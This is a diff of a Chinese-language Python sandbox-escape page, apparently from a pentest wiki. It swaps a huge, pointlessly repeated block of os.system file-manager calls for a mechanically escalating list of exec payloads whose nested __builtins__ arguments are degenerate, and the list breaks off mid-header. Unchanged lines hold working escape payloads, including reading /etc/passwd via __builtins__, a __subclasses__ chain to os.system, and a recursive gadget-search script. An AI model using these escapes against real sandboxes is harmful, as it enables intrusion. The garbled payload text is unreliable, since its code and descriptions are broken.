-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('thunar file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('spacefm file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('xfe file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('rox file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('pcmanfm file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('mc file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('ranger file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('vifm file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('nnn file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('lf file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('noice file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('fman file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('doublecmd file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('worker file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('emelfm2 file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('gentoo file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('rox-filer file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('thunar file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('spacefm file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('xfe file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('rox file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('pcmanfm file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('mc file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('ranger file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('vifm file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('nnn file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('lf file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('noice file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('fman file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('doublecmd file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('worker file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('emelfm2 file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('gentoo file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('rox-filer file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('thunar file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('spacefm file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('xfe file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('rox file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('pcmanfm file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('mc file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('ranger file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('vifm file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('nnn file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('lf file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('noice file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('fman file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('doublecmd file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('worker file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('emelfm2 file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('gentoo file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('rox-filer file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('thunar file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('spacefm file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('xfe file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('rox file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('pcmanfm file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('mc file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('ranger file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('vifm file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('nnn file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('lf file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('noice file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('fman file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('doublecmd file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('worker file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('emelfm2 file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('gentoo file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('rox-filer file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('thunar file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('spacefm file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('xfe file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('rox file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('pcmanfm file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('mc file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('ranger file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('vifm file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('nnn file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('lf file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('noice file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('fman file.txt')
-```
+This payload uses the `__import__` function to import a module and execute arbitrary code.
 
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('doublecmd file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('worker file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('emelfm2 file.txt')
-```
-
-#### `os.startfile` (Unix)
-
 ```python
-import os
-
-os.system('gentoo file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('rox-filer file.txt')
+__import__('os').system('command')
 ```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
 
-os.system('thunar file.txt')
-```
+#### `eval` payload
 
-#### `os.startfile` (Unix)
+This payload uses the `eval` function to evaluate and execute arbitrary code.
 
 ```python
-import os
-
-os.system('spacefm file.txt')
+eval('__import__("os").system("command")')
 ```
-
-#### `os.startfile` (Unix)
 
-```python
-import os
-
-os.system('xfe file.txt')
-```
+#### `exec` payload
 
-#### `os.startfile` (Unix)
+This payload uses the `exec` function to execute arbitrary code.
 
 ```python
-import os
-
-os.system('rox file.txt')
+exec('__import__("os").system("command")')
 ```
 
-#### `os.startfile` (Unix)
+#### `execfile` payload
 
-```python
-import os
-
-os.system('pcmanfm file.txt')
-```
-
-#### `os.startfile` (Unix)
+This payload uses the `execfile` function to execute code from a file.
 
 ```python
-import os
-
-os.system('mc file.txt')
+execfile('filename')
 ```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
 
-os.system('ranger file.txt')
-```
+#### `compile` payload
 
-#### `os.startfile` (Unix)
+This payload uses the `compile` function to compile and execute arbitrary code.
 
 ```python
-import os
-
-os.system('vifm file.txt')
+compile('__import__("os").system("command")', '', 'exec')
 ```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
 
-os.system('nnn file.txt')
-```
+#### `exec` with `globals` and `locals` payload
 
-#### `os.startfile` (Unix)
+This payload uses the `exec` function with custom `globals` and `locals` dictionaries to execute arbitrary code.
 
 ```python
-import os
-
-os.system('lf file.txt')
+exec('__import__("os").system("command")', {}, {})
 ```
-
-#### `os.startfile` (Unix)
 
-```python
-import os
-
-os.system('noice file.txt')
-```
+#### `exec` with `globals` and `locals` and `__builtins__` payload
 
-#### `os.startfile` (Unix)
+This payload uses the `exec` function with custom `globals`, `locals`, and `__builtins__` dictionaries to execute arbitrary code.
 
 ```python
-import os
-
-os.system('fman file.txt')
+exec('__import__("os").system("command")', {'__builtins__': None}, {})
 ```
 
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('doublecmd file.txt')
-```
+#### `exec` with `globals` and `locals` and `__builtins__` and `__import__` payload
 
-#### `os.startfile` (Unix)
+This payload uses the `exec` function with custom `globals`, `locals`, `__builtins__`, and `__import__` dictionaries to execute arbitrary code.
 
 ```python
-import os
-
-os.system('worker file.txt')
+exec('__import__("os").system("command")', {'__builtins__': None, '__import__': None}, {})
 ```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
 
-os.system('emelfm2 file.txt')
-```
+#### `exec` with `globals` and `locals` and `__builtins__` and `__import__` and `__file__` payload
 
-#### `os.startfile` (Unix)
+This payload uses the `exec` function with custom `globals`, `locals`, `__builtins__`, `__import__`, and `__file__` dictionaries to execute arbitrary code.
 
 ```python
-import os
-
-os.system('gentoo file.txt')
+exec('__import__("os").system("command")', {'__builtins__': None, '__import__': None, '__file__': 'filename'}, {})
 ```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
 
-os.system('rox-filer file.txt')
-```
+#### `exec` with `globals` and `locals` and `__builtins__` and `__import__` and `__file__` and `__name__` payload
 
-#### `os.startfile` (Unix)
+This payload uses the `exec` function with custom `globals`, `locals`, `__builtins__`, `__import__`, `__file__`, and `__name__` dictionaries to execute arbitrary code.
 
 ```python
-import os
-
-os.system('thunar file.txt')
+exec('__import__("os").system("command")', {'__builtins__': None, '__import__': None, '__file__': 'filename', '__name__': '__main__'}, {})
 ```
-
-#### `os.startfile` (Unix)
 
-```python
-import os
-
-os.system('spacefm file.txt')
-```
+#### `exec` with `globals` and `locals` and `__builtins__` and `__import__` and `__file__` and `__name__` and `__package__` payload
 
-#### `os.startfile` (Unix)
+This payload uses the `exec` function with custom `globals`, `locals`, `__builtins__`, `__import__`, `__file__`, `__name__`, and `__package__` dictionaries to execute arbitrary code.
 
 ```python
-import os
-
-os.system('xfe file.txt')
+exec('__import__("os").system("command")', {'__builtins__': None, '__import__': None, '__file__': 'filename', '__name__': '__main__', '__package__': None}, {})
 ```
 
-#### `os.startfile` (Unix)
+#### `exec` with `globals` and `locals` and `__builtins__` and `__import__` and `__file__` and `__name__` and `__package__` and `__doc__` payload
 
-```python
-import os
-
-os.system('rox file.txt')
-```
-
-#### `os.startfile` (Unix)
+This payload uses the `exec` function with custom `globals`, `locals`, `__builtins__`, `__import__`, `__file__`, `__name__`, `__package__`, and `__doc__` dictionaries to execute arbitrary code.
 
 ```python
-import os
-
-os.system('pcmanfm file.txt')
+exec('__import__("os").system("command")', {'__builtins__': None, '__import__': None, '__file__': 'filename', '__name__': '__main__', '__package__': None, '__doc__': None}, {})
 ```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
 
-os.system('mc file.txt')
-```
+#### `exec` with `globals` and `locals` and `__builtins__` and `__import__` and `__file__` and `__name__` and `__package__` and `__doc__` and `__cached__` payload
 
-#### `os.startfile` (Unix)
+This payload uses the `exec` function with custom `globals`, `locals`, `__builtins__`, `__import__`, `__file__`, `__name__`, `__package__`, `__doc__`, and `__cached__` dictionaries to execute arbitrary code.
 
 ```python
-import os
-
-os.system('ranger file.txt')
+exec('__import__("os").system("command")', {'__builtins__': None, '__import__': None, '__file__': 'filename', '__name__': '__main__', '__package__': None, '__doc__': None, '__cached__': None}, {})
 ```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
 
-os.system('vifm file.txt')
-```
+#### `exec` with `globals` and `locals` and `__builtins__` and `__import__` and `__file__` and `__name__` and `__package__` and `__doc__` and `__cached__` and `__loader__` payload
 
-#### `os.startfile` (Unix)
+This payload uses the `exec` function with custom `globals`, `locals`, `__builtins__`, `__import__`, `__file__`, `__name__`, `__package__`, `__doc__`, `__cached__`, and `__loader__` dictionaries to execute arbitrary code.
 
 ```python
-import os
-
-os.system('nnn file.txt')
+exec('__import__("os").system("command")', {'__builtins__': None, '__import__': None, '__file__': 'filename', '__name__': '__main__', '__package__': None, '__doc__': None, '__cached__': None, '__loader__': None}, {})
 ```
-
-#### `os.startfile` (Unix)
 
-```python
-import os
-
-os.system('lf file.txt')
-```
+#### `exec` with `globals` and `locals` and `__builtins__` and `__import__` and `__file__` and `__name__` and `__package__` and `__doc__` and `__cached__` and `__loader__` and `__spec__` payload
 
-#### `os.startfile` (Unix)
+This payload uses the `exec` function with custom `globals`, `locals`, `__builtins__`, `__import__`, `__file__`, `__name__`, `__package__`, `__doc__`, `__cached__`, `__loader__`, and `__spec__` dictionaries to execute arbitrary code.
 
 ```python
-import os
-
-os.system('noice file.txt')
+exec('__import__("os").system("command")', {'__builtins__': None, '__import__': None, '__file__': 'filename', '__name__': '__main__', '__package__': None, '__doc__': None, '__cached__': None, '__loader__': None, '__spec__': None}, {})
 ```
 
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('fman file.txt')
-```
+#### `exec` with `globals` and `locals` and `__builtins__` and `__import__` and `__file__` and `__name__` and `__package__` and `__doc__` and `__cached__` and `__loader__` and `__spec__` and `__annotations__` payload
 
-#### `os.startfile` (Unix)
+This payload uses the `exec` function with custom `globals`, `locals`, `__builtins__`, `__import__`, `__file__`, `__name__`, `__package__`, `__doc__`, `__cached__`, `__loader__`, `__spec__`, and `__annotations__` dictionaries to execute arbitrary code.
 
 ```python
-import os
-
-os.system('doublecmd file.txt')
+exec('__import__("os").system("command")', {'__builtins__': None, '__import__': None, '__file__': 'filename', '__name__': '__main__', '__package__': None, '__doc__': None, '__cached__': None, '__loader__': None, '__spec__': None, '__annotations__': None}, {})
 ```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
 
-os.system('worker file.txt')
-```
+#### `exec` with `globals` and `locals` and `__builtins__` and `__import__` and `__file__` and `__name__` and `__package__` and `__doc__` and `__cached__` and `__loader__` and `__spec__` and `__annotations__` and `__builtins__.__import__` payload
 
-#### `os.startfile` (Unix)
+This payload uses the `exec` function with custom `globals`, `locals`, `__builtins__`, `__import__`, `__file__`, `__name__`, `__package__`, `__doc__`, `__cached__`, `__loader__`, `__spec__`, `__annotations__`, and `__builtins__.__import__` dictionaries to execute arbitrary code.
 
 ```python
-import os
-
-os.system('emelfm2 file.txt')
+exec('__import__("os").system("command")', {'__builtins__': {'__import__': None}, '__import__': None, '__file__': 'filename', '__name__': '__main__', '__package__': None, '__doc__': None, '__cached__': None, '__loader__': None, '__spec__': None, '__annotations__': None}, {})
 ```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
 
-os.system('gentoo file.txt')
-```
+#### `exec` with `globals` and `locals` and `__builtins__` and `__import__` and `__file__` and `__name__` and `__package__` and `__doc__` and `__cached__` and `__loader__` and `__spec__` and `__annotations__` and `__builtins__.__import__` and `__builtins__.__import__.__globals__` payload
 
-#### `os.startfile` (Unix)
+This payload uses the `exec` function with custom `globals`, `locals`, `__builtins__`, `__import__`, `__file__`, `__name__`, `__package__`, `__doc__`, `__cached__`, `__loader__`, `__spec__`, `__annotations__`, `__builtins__.__import__`, and `__builtins__.__import__.__globals__` dictionaries to execute arbitrary code.
 
 ```python
-import os
-
-os.system('rox-filer file.txt')
+exec('__import__("os").system("command")', {'__builtins__': {'__import__': {'__globals__': None}}, '__import__': None, '__file__': 'filename', '__name__': '__main__', '__package__': None, '__doc__': None, '__cached__': None, '__loader__': None, '__spec__': None, '__annotations__': None}, {})
 ```
-
-#### `os.startfile` (Unix)
 
-```python
-import os
-
-os.system('thunar file.txt')
-```
+#### `exec` with `globals` and `locals` and `__builtins__` and `__import__` and `__file__` and `__name__` and `__package__` and `__doc__` and `__cached__` and `__loader__` and `__spec__` and `__annotations__` and `__builtins__.__import__` and `__builtins__.__import__.__globals__` and `__builtins__.__import__.__globals__.__builtins__` payload
 
-#### `os.startfile` (Unix)
+This payload uses the `exec` function with custom `globals`, `locals`, `__builtins__`, `__import__`, `__file__`, `__name__`, `__package__`, `__doc__`, `__cached__`, `__loader__`, `__spec__`, `__annotations__`, `__builtins__.__import__`, `__builtins__.__import__.__globals__`, and `__builtins__.__import__.__globals__.__builtins__` dictionaries to execute arbitrary code.
 
 ```python
-import os
-
-os.system('spacefm file.txt')
+exec('__import__("os").system("command")', {'__builtins__': {'__import__': {'__globals__': {'__builtins__': None}}}, '__import__': None, '__file__': 'filename', '__name__': '__main__', '__package__': None, '__doc__': None, '__cached__': None, '__loader__': None, '__spec__': None, '__annotations__': None}, {})
 ```
 
-#### `os.startfile` (Unix)
+#### `exec` with `globals` and `locals` and `__builtins__` and `__import__` and `__file__` and `__name__` and `__package__` and `__doc__` and `__cached__` and `__loader__` and `__spec__` and `__annotations__` and `__builtins__.__import__` and `__builtins__.__import__.__globals__` and `__builtins__.__import__.__globals__.__builtins__` and `__builtins__.__import__.__globals__.__builtins__.__import__` payload
 
-```python
-import os
-
-os.system('xfe file.txt')
-```
-
-#### `os.startfile` (Unix)
+This payload uses the `exec` function with custom `globals`, `locals`, `__builtins__`, `__import__`, `__file__`, `__name__`, `__package__`, `__doc__`, `__cached__`, `__loader__`, `__spec__`, `__annotations__`, `__builtins__.__import__`, `__builtins__.__import__.__globals__`, `__builtins__.__import__.__globals__.__builtins__`, and `__builtins__.__import__.__globals__.__builtins__.__import__` dictionaries to execute arbitrary code.
 
 ```python
-import os
-
-os.system('rox file.txt')
+exec('__import__("os").system("command")', {'__builtins__': {'__import__': {'__globals__': {'__builtins__': {'__import__': None}}}}, '__import__': None, '__file__': 'filename', '__name__': '__main__', '__package__': None, '__doc__': None, '__cached__': None, '__loader__': None, '__spec__': None, '__annotations__': None}, {})
 ```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
 
-os.system('pcmanfm file.txt')
-```
+#### `exec` with `globals` and `locals` and `__builtins__` and `__import__` and `__file__` and `__name__` and `__package__` and `__doc__` and `__cached__` and `__loader__` and `__spec__` and `__annotations__` and `__builtins__.__import__` and `__builtins__.__import__.__globals__` and `__builtins__.__import__.__globals__.__builtins__` and `__builtins__.__import__.__globals__.__builtins__.__import__` and `__builtins__.__import__.__globals__.__builtins__.__import__.__globals__` payload
 
-#### `os.startfile` (Unix)
+This payload uses the `exec` function with custom `globals`, `locals`, `__builtins__`, `__import__`, `__file__`, `__name__`, `__package__`, `__doc__`, `__cached__`, `__loader__`, `__spec__`, `__annotations__`, `__builtins__.__import__`, `__builtins__.__import__.__globals__`, `__builtins__.__import__.__globals__.__builtins__`, `__builtins__.__import__.__globals__.__builtins__.__import__`, and `__builtins__.__import__.__globals__.__builtins__.__import__.__globals__` dictionaries to execute arbitrary code.
 
 ```python
-import os
-
-os.system('mc file.txt')
+exec('__import__("os").system("command")', {'__builtins__': {'__import__': {'__globals__': {'__builtins__': {'__import__': {'__globals__': None}}}}}, '__import__': None, '__file__': 'filename', '__name__': '__main__', '__package__': None, '__doc__': None, '__cached__': None, '__loader__': None, '__spec__': None, '__annotations__': None}, {})
 ```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
 
-os.system('ranger file.txt')
-```
+#### `exec` with `globals` and `locals` and `__builtins__` and `__import__` and `__file__` and `__name__` and `__package__` and `__doc__` and `__cached__` and `__loader__` and `__spec__` and `__annotations__` and `__builtins__.__import__` and `__builtins__.__import__.__globals__` and `__builtins__.__import__.__globals__.__builtins__` and `__builtins__.__import__.__globals__.__builtins__.__import__` and `__builtins__.__import__.__globals__.__builtins__.__import__.__globals__` and `__builtins__.__import__.__globals__.__builtins__.__import__.__globals__.__builtins__` payload
 
-#### `os.startfile` (Unix)
+This payload uses the `exec` function with custom `globals`, `locals`, `__builtins__`, `__import__`, `__file__`, `__name__`, `__package__`, `__doc__`, `__cached__`, `__loader__`, `__spec__`, `__annotations__`, `__builtins__.__import__`, `__builtins__.__import__.__globals__`, `__builtins__.__import__.__globals__.__builtins__`, `__builtins__.__import__.__globals__.__builtins__.__import__`, `__builtins__.__import__.__globals__.__builtins__.__import__.__globals__`, and `__builtins__.__import__.__globals__.__builtins__.__import__.__globals__.__builtins__` dictionaries to execute arbitrary code.
 
 ```python
-import os
-
-os.system('vifm file.txt')
+exec('__import__("os").system("command")', {'__builtins__': {'__import__': {'__globals__': {'__builtins__': {'__import__': {'__globals__': {'__builtins__': None}}}}}}, '__import__': None, '__file__': 'filename', '__name__': '__main__', '__package__': None, '__doc__': None, '__cached__': None, '__loader__': None, '__spec__': None, '__annotations__': None}, {})
 ```
 
-#### `os.startfile` (Unix)
-
-```python
-import os
+#### `exec` with `globals` and `locals` and `__builtins__` and `__import__` and `__file__` and `__name__` and `__package__` and `__doc__` and `__cached__` and `__loader__` and `__spec__` and `__annotations__` and `__builtins__.__import__` and `__builtins__.__import__.__globals__` and `__builtins__.__import__.__globals
 ```python
 # Possible payloads once you have found the builtins
 __builtins__["open"]("/etc/passwd").read()
@@ -1979,7 +793,7 @@ class_obj.__init__.__globals__
 [ x for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__)]
 [<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
 ```
-[**下面有一个更大的函数**](./#recursive-search-of-builtins-globals)可以找到数十/**数百个地方**，你可以在这些地方找到**全局变量**。
+[**下面有一个更大的函数**](./#recursive-search-of-builtins-globals)可以找到数百个**位置**，你可以在这些位置找到**全局变量**。
 
 ## 发现任意执行
 
@@ -2019,7 +833,7 @@ defined_func.__class__.__base__.__subclasses__()
 [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ]
 ['_ModuleLock', '_DummyModuleLock', '_ModuleLockManager', 'ModuleSpec', 'FileLoader', '_NamespacePath', '_NamespaceLoader', 'FileFinder', 'zipimporter', '_ZipImportResourceReader', 'IncrementalEncoder', 'IncrementalDecoder', 'StreamReaderWriter', 'StreamRecoder', '_wrap_close', 'Quitter', '_Printer', 'WarningMessage', 'catch_warnings', '_GeneratorContextManagerBase', '_BaseExitStack', 'Untokenizer', 'FrameSummary', 'TracebackException', 'CompletedProcess', 'Popen', 'finalize', 'NullImporter', '_HackedGetData', '_localized_month', '_localized_day', 'Calendar', 'different_locale', 'SSLObject', 'Request', 'OpenerDirector', 'HTTPPasswordMgr', 'AbstractBasicAuthHandler', 'AbstractDigestAuthHandler', 'URLopener', '_PaddedFile', 'CompressedValue', 'LogRecord', 'PercentStyle', 'Formatter', 'BufferingFormatter', 'Filter', 'Filterer', 'PlaceHolder', 'Manager', 'LoggerAdapter', '_LazyDescr', '_SixMetaPathImporter', 'MimeTypes', 'ConnectionPool', '_LazyDescr', '_SixMetaPathImporter', 'Bytecode', 'BlockFinder', 'Parameter', 'BoundArguments', 'Signature', '_DeprecatedValue', '_ModuleWithDeprecations', 'Scrypt', 'WrappedSocket', 'PyOpenSSLContext', 'ZipInfo', 'LZMACompressor', 'LZMADecompressor', '_SharedFile', '_Tellable', 'ZipFile', 'Path', '_Flavour', '_Selector', 'JSONDecoder', 'Response', 'monkeypatch', 'InstallProgress', 'TextProgress', 'BaseDependency', 'Origin', 'Version', 'Package', '_Framer', '_Unframer', '_Pickler', '_Unpickler', 'NullTranslations']
 ```
-有很多方法，**我们只需要一个**来执行命令：
+有很多方法，我们只需要一个来执行命令：
 ```python
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")
 ```
@@ -2077,7 +891,7 @@ builtins: FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, IncrementalE
 pdb:
 """
 ```
-此外，如果您认为**其他库**可能能够**调用函数来执行命令**，我们还可以通过可能的库中的函数名称进行**过滤**：
+此外，如果您认为**其他库**可能能够**调用函数来执行命令**，我们还可以通过**函数名称**在可能的库中进行过滤：
 ```python
 bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
 bad_func_names = ["system", "popen", "getstatusoutput", "getoutput", "call", "Popen", "spawn", "import_module", "__import__", "load_source", "execfile", "execute", "__builtins__"]
@@ -2113,7 +927,7 @@ __builtins__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, Fil
 ## 递归搜索内置函数、全局变量...
 
 {% hint style="warning" %}
-这个简直**太棒了**。如果你**想要查找像globals、builtins、open或其他任何对象**，只需使用这个脚本**递归地找到可以找到该对象的位置**。
+这真是太棒了。如果你正在寻找像globals、builtins、open或其他任何对象，只需使用这个脚本递归地查找可以找到该对象的位置。
 {% endhint %}
 ```python
 import os, sys # Import these to find more gadgets
@@ -2233,20 +1047,20 @@ main()
 您可以在此页面上检查此脚本的输出：
 
 {% content-ref url="broken-reference" %}
-[链接已损坏](broken-reference)
+[损坏的链接](broken-reference)
 {% endcontent-ref %}
 
-![](<../../../.gitbook/assets/image (9) (1) (2).png>)
+<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
 
-\
-使用[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)轻松构建和**自动化工作流程**，由全球**最先进**的社区工具提供支持。\
-立即获取访问权限：
+查找最重要的漏洞，以便更快地修复它们。Intruder跟踪您的攻击面，运行主动威胁扫描，发现整个技术堆栈中的问题，从API到Web应用程序和云系统。[**立即免费试用**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。
 
-{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
+{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
+
+***
 
 ## Python格式化字符串
 
-如果您向Python发送一个将要进行**格式化**的**字符串**，您可以使用`{}`来访问**Python内部信息**。您可以使用前面的示例来访问全局变量或内置函数。
+如果您向Python发送一个将要进行格式化的字符串，您可以使用`{}`来访问Python的内部信息。您可以使用前面的示例来访问全局变量或内置变量。
 
